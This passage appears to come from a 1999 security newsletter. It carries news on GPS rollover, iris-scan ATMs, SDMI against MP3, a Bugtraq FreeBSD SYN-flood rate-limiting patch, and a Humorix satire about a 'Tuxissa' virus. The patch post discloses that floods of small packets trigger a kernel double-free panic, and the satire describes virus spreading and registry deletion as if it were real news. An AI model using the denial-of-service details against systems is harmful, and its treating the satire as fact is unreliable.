      Handheld receivers such as those popular with mountaineers, sailors and some
      motorists are "probably going to have a problem" if they are more than five
      years old, Rhodes said. 

      Also vulnerable are small computer networks that rely on GPS time signals, a
      desirable form of time measurement because they are accurate to within
      three-billionths of a second. 

      More widespread computer problems are expected a little more than four
      months later, when the calendar changes from December 31, 1999, to January
      1, 2000 -- the Y2K witching hour. Many computers originally programmed to
      recognize only the last two digits of a year will not work properly beginning
      January 1, 2000, when some machines will assume it is 1900 and could
      therefore malfunction.

      No ATM card or PIN numbers needed. Bank United,
      based in Texas, is the first to offer Iris scans at its
      ATMs for its customers. Just walk up to the ATM, let
      the computer check out your eyeball and withdraw
      some dough. In response to questions about privacy
      concerns, Bank United said the iris pictures will not be
      distributed to anyone outside the bank. (Unless they
      get subpoenaed or cracked, of course.)

      Texas bank offers 1st eye-recognition ATM in U.S.

      By TERRI LANGFORD 
      
      HOUSTON (May 13, 1999 6:03 p.m. EDT http://www.nandotimes.com) - If you can't tell twins Michael 
      and Richard Swartz apart, do what Bank United of Texas does - look them in the eye. On Thursday, 
      the bank became the first in the United States to offer iris recognition technology at automated 
      teller machines, providing the Swartzes and other customers a cardless, password-free way to get 
      their money out of an ATM. 
      
      "It knows you just by looking at you," said Ron Koben, Bank United executive vice president. 
      
      The concept works because the intricate pattern of each person's iris is more distinctive than 
      even a fingerprint. 
      
      Here's how it works: A customer has a close-up photo of his eye taken at the bank, and the picture
      is stored in a computer. When the customer goes up to the ATM to take out money, he presses a button
      to start an eye scan. The ATM then matches the picture of the iris with the one stored in the bank's
      database to confirm the customer's identity. 
      
      To demonstrate, Richard Swartz, a 25-year-old Rice University graduate student, had his iris 
      photographed by a bank employee. Minutes later, Swartz was able to withdraw $40 from his account 
      without inserting a card or punching in a secret code. 
      
      Then, Swartz's brother Michael walked up to the machine. But since his iris didn't match his brother's,
      the ATM refused access. 
      
      Iris identification is already used at 11 banks outside the United States and may eventually be 
      extended to many other kinds of financial transactions. 
      
      Bank United hopes to have more eye-scanning ATMs up and running within the next year. Several other 
      banks in the United States are expected to unveil iris identification teller machines later this year. 
      
      "It has a very high cool factor," Koben said. "We think of it as James Bond meets stocks and bonds." 
      
      The iris recognition and software process was invented a few years ago by John Daughman of Cambridge 
      University in England. It is marketed in this country to financial institutions by Sensar Inc. of 
      Moorestown, N.J. 
      
      "This event clearly establishes iris identification as the emerging standard in personal electronic
      identfication," said Robert Van Naarden, Sensar vice president of marketing and customer service. "Iris
      identification is the most secure, robust and stable form of identification known to man." 
      
      In response to questions about privacy concerns, Bank United said the iris pictures will not be 
      distributed to anyone outside the bank.

 56.0 FreeBSD high speed SYNflood patch

      Subject:      SYN floods against FreeBSD 
      To: BUGTRAQ@netspace.org 
      
      
      Here's a quickie for the people who have been plagued with high bandwidth
      syn flood attacks, a kernel patch for FreeBSD 3.1-STABLE which rate limits
      SYN processing. Its messy but functional and I don't have time to make it
      better (thats the fbsd developers job, not mine :P), cd /usr/src/sys,
      patch < synlim, add "options SYN_RATELIM" (I highly recommend ICMP_BANDLIM
      as well) to your kernel, recompile, and sysctl net.inet.tcp.synlim will be
      available (default to 100). This is the maximium number of SYNs per second
      that will be processed, the rest will be silently discarded. On my test
      system (P2 450 running 3.1-stable being hit w/15,000 packets per sec),
      this has successfully brought CPU usage from 100% to ~20% (against an open
      port which is replying with unacknowledged ACKs).
      
      
      Which brings us to the more sticky topic of kernel panics when under SYN
      flood (which I believe to be the cause of some earlier posts from certain
      people at Exodus Communications *cough*). Lord knows I found enough of
      them when doing this testing, but the one that seems to be the biggie for
      crashing when under syn flood is as follows (heh just turned off the
      synlim and panic'd within 8 seconds while writing this):
      
      
      panic: free: multiple frees
      (kgdb) bt
      #0  boot (howto=256) at ../../kern/kern_shutdown.c:285

      #9  0xc013d19b in softclock () at ../../kern/kern_timeout.c:124
      
      
      Which after a quick examination seems to be a perioditic routing table
      cleanup. It seems that in_rtqtimo is scheduled to run every
      net.inet.ip.rtexpire seconds (which is dynamicly adjusted and can never go
      lower then net.inet.ip.rtminexpire). When the system is under heavy load
      from processing lots of small packets (they don't even have to be SYNs,
      anything which can get routed will do the trick, though the packet kiddies
      would get very little gain from just sending an ip header since its going
      to be padded to 64 bytes for the eth frame anyhow), this route cleanup
      code will go wacking at routes it shouldn't and free some memory twice. In
      the course of testing I've gotten my rtq_reallyold to -3 and seen lots of
      "tvotohz: negative time difference -2 sec 0 usec". Perhaps someone with
      free time or more specific knowledge of this area would like to FIX IT? =)
      
      
      Perhaps when I get more free time I'll test some other *nix's. I would
      really recommend putting all this rate limiting code at an ipfw level.
      
      
      If you would like to contact me regarding this please use
      humble@quadrunner.com (at least if you want a quick reply), thanks.

 57.0 Industry rises up against MP3 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      I was waiting for this, it took them long enough but it looks like industry is finally waking up to
      the threat of MP3 and are beginning to make some noise about it.
      
      MUSIC BIZ BUILDS A TIME BOMB (TECH. 3:00 am)
      http://www.wired.com/news/news/email/explode-infobeat/technology/story/19682.html


      The Recording Industry Association of America is out to
      exterminate MP3 -- and is pressuring hardware and software
      makers to build in a "kill switch" that would take care of
      it once and for all. By Christopher Jones.
      
      Music Biz Builds A Time Bomb
      by Christopher Jones 
      
      3:00 a.m.  14.May.99.PDT
      The future of digital music delivery is at stake as technology companies and record labels try to bridge
      their multibillion-dollar industries. But the two sides are making little progress, reports one tech-
      industry insider, who says that the music industry is taking a "my way or the highway"  approach. 
      
      Facing the loss of its lucrative distribution chains and existing contracts with retailers, the record 
      industry has a plan to force hardware and software companies to exclusively adopt its Secure Digital Music
      Initiative as the standard for delivering music online. 
      
            
      At last week's SDMI meeting in London, a handpicked committee proposed a plan that could force hardware and
      software developers to choose among wannabe SDMI, the de facto standard MP3, or a different compressed file
      format for the development of digital music players and similar hardware. 
      
      SDMI backers want manufacturers to build a time-bomb trigger into their products that, when activated at a 
      later date, would prevent users from downloading or playing non-SDMI-compliant music. The hardware would 
      initially support MP3 and other compressed file formats, but a signal from the RIAA would activate the 
      blocking trigger. 
      
      Hardware and software developers that refuse to build in the switch would not have access to the SDMI 
      specifications or the major-label music that will be made available when the specification is complete. 
      
      According to a source who attended the SDMI meeting last week, participants discovered that the Internet and
      music industries have precious little in common. Coming to a consensus on the delivery of digital music may 
      be all but impossible, said the source, who requested anonymity. 
      
      Committee members from the technology industry were convinced that record labels don't "get" the Internet, 
      where open standards are the norm. Others were upset that the subcommittee was so exclusive. Microsoft, 
      Lucent, and a handful of PC manufacturers were the only technology companies present in sessions dominated 
      by the RIAA and its record labels. 
      
      "There was a lot of distaste around the room and loud conversations in the hallway with Leo [Leonardo 
      Chiariglione, executive director of SDMI] and Cary [Sherman, senior executive vice president for the RIAA],"
      the source said. 
      
      The RIAA refused to comment on the negotiations. 
      
      "Ultimately, if it continues down this path, there will be an unworkable solution for the customers," said
      the SDMI source. "Will I buy a Rio that supports MP3, or possibly a Samsung player that does not? The labels
      are concerned about their distribution channels and how the stores will treat them. But while there are 30,000
      titles in brick-and-mortar, the labels own 10 times that." 
      
      Another source who attended the meeting, and who also asked to remain anonymous, said that PC and hardware 
      makers are resisting the RIAA's plans because they see an immediate market for MP3-based players. Already there
      are many players on the street and under development, and the market for selling legitimate MP3 music and 
      products is in its infancy. 
      
      "This transition group asked the question, 'do we ban MP3s?' and the answer was a clear and resounding 'no' 
      from PC makers. They are not going to  drop support for MP3 anytime soon, and more and more manufacturers want
      to have players ready for Christmas," said the source. For other companies caught in the middle of the debate,
      the issues were not so clear-cut. "With companies like Sony, that sell both content and hardware and are on both 
      sides of the battle, it's very interesting," the source said. 
      
      The initial SDMI specification for portable players is due by the end of June, and a full-blown architecture by
      March 2000. There are several encryption and security companies currently working on the proposed trigger device 
      that will present their solutions within the next few weeks. The next SDMI meeting is scheduled for next week in 
      Washington. 
      
      "This reminds me of the early days of the CD recording market, with all the different file formats and people 
      jockeying for position. The same thing is happening here, but there are 250 participants," said Dave Ulmer, 
      general manager of Adaptec's software products group, who was at the SDMI meeting in London. "There are companies 
      that see their future hinging on being part of this SDMI solution, and others just want to know what it is."
      
      One source said that "there is no way in hell" that SDMI-compliant products will be ready for the Christmas 
      season because "the individuals involved in these conversations are too concerned about their interests and [are] 
      not looking for a real solution. Some guy with a digital kiosk wants everything for kiosks, and another guy with 
      encryption wants his stuff in, and so on." 
      
      Steve Grady, vice president of marketing at MP3 retailer GoodNoise, said that if the record labels don't put the 
      consumer first in their architecture plans, piracy will only increase and the industry could ultimately lose out 
      on new business opportunities on the Web. 
      
      "The problem is that you're talking about consumers and people adopting a technology and using music in a certain
      way. But you have to stay focused on the consumer here. What you're competing against is free product, and that 
      won't go away," Grady said. "Something better than MP3 will come along. The ability to move music around is key,
      and if you try to force something that has attributes they don't want, it won't be successful." 
      
      While the SDMI specification may ultimately become the standard for the music industry, there is no guarantee that
      it has the inside track. 
      
      During the past few weeks, recording industry companies have formed alliances that could undermine SDMI's acceptance.
      Lucent teamed up with the Universal Music Group, while Microsoft allied with Sony on content distribution deals. 
      
      In the coming months, the SDMI equation could get even more complicated if the major labels decide to go their own way. 
      
      "What's interesting is Universal and Sony. It's like the Oklahoma land rush with their marketing power and Microsoft's 
      monopoly," said one source. "If they get the market to adopt their standard, it's wide open. I don't think SDMI has a 
      lock on what the standard will be." 
      
      "Welcome to the software business," was the general sentiment among sources who recalled the similar battles over 
      standards within the Internet industry. 
      
      "[It's] turning into the Unix battle of the music industry," said one source, who said that ultimately open standards
      will prevail. "Any company that tries [proprietary formats] realizes it fails. Look at IBM, one of the oldest computer
      companies, and they've embraced the Web. It's a hard lesson, and the labels may have to learn it." 
      
      The RIAA has made it clear that it's willing to fight for its interests in the courts. It has the money and the muscle
      to try to convince technology companies and Internet music vendors to see things its way. But just the same, it may not
      win the battle. 
      
      "There is a big gap in the way major labels think about the world and what's going on today on the Internet. For all 
      the discussion on format battles, is there really a battle going on in the consumer space?" Grady said. 
      
      "There is only one player right now, and it's MP3. The only battle is taking place is in meeting rooms. The Internet is
      a different environment, and the labels need to understand the culture and what you are dealing with here," Grady said.

      Attack of the Tuxissa Virus
      March 29, 1999
      
      What started out as a prank posting to
      comp.os.linux.advocacy yesterday has turned into one of the
      most significant viruses in computing history.   The
      creator of the virus, who goes by the moniker "Anonymous
      Longhair", modified the well-known Melissa[1] virus to
      download and install Linux on infected machines.  
      
      "It's a work of art," one Linux advocate told Humorix after
      he looked through the Tuxissa virus source code.  "This
      virus goes well beyond the feeble troublemaking of
      Melissa."  The advocate enumerated some of the tasks the
      virus performs in the background while the user is
      blissfully playing Solitaire:
      
      Once the virus is activated, it first works on propogating
      itself. It has a built-in email harvesting module that
      downloads all the pages referenced in the user's Internet
      Explorer bookmarks and scans them for email addresses. 
      Using Outlook, the virus sends a copy of itself to every
      email address it comes across.
      
      After it has successfully reproduced, the virus begins the
      tricky process of upgrading the system to Linux.   First,
      the virus modifies AUTOEXEC.BAT so that the virus will be
      re-activated if the system crashes or is shut down while
      the upgrade is in process. Second, the virus downloads a
      stripped-down Slackware distribution, using a lengthy list
      of mirror sites to prevent the virus from overloading any
      one server.
      
      Then the virus configures a UMSDOS filesystem to install
      Linux on.  Since this filesystem resides on a FAT
      partition, there is no need to re-partition the hard drive,
      one of the few actions that the Word macro langugage
      doesn't allow.
      
      Next, the virus uncompresses the downloaded files into the
      new Linux filesystem.  The virus then permanently deletes
      all copies of the Windows Registry, virtually preventing
      the user from booting into Windows without a re-install. 
      After modifying the boot sector, the virus terminates its
      own life by rebooting the system. The computer boots into
      the Slackware setup program, which automatically finishes
      the installation of Linux.  Finally, the dazed user is
      presented with the Linux login prompt and the text,
      "Welcome to Linux.  You'll never want to use Windows again.
      Type 'root' to begin..."
      
      The whole process take about two hours, assuming the user
      has a decent Internet connection.  Since the virus runs
      invisibly in the background, the user has no chance to stop
      it until it's too late.
      
      The email message that the virus is attached to has the
      subject "Important Message About Windows Security".  The
      text of the body says, "I want to let you know about some
      security problems I've uncovered in Windows 95/98/NT,
      Office 95/97, and Outlook. It's critically important that
      you protect your system against these attacks.  Visit these
      sites for more information..."  The rest of the message
      contains 42 links to sites about Linux and free software.
      
      Slashdot is one of those links.  "That could spell
      trouble," one Slashdot expert told Humorix.  "Slashdot
      could fall victim to the new 'Macro Virus Effect' if this
      virus continues to propogate at its present exponential
      growth rate.  Red Hat's portal site, another site present
      on the virus' links list, seems to be quite sluggish right
      now..."
      
      Details on how the virus started are a bit sketchy.  The
      "Anonymous Longhair" who created it only posted it to
      Usenet as an early April Fool's gag, a demonstration of how
      easy it would be to mount a "Linux revolution".  Some other
      Usenet reader is responsible for actually spreading the
      virus into the wild.  One observer speculated, "I imagine
      the virus was first sent to the addresses of several
      well-known spammers.  The virus probably latched on to the
      spammer's email lists and began propagating at a fantastic
      rate.  With no boundary to its growth, this thing could
      wind up infecting every single Net-connected Wintel box in
      the world.  Wouldn't that be a shame!"
      
      Linus Torvalds, who just left for a two week vacation, was
      unavailable for comment at press time.  We have a strong
      feeling that his vacation will be cut short very soon...
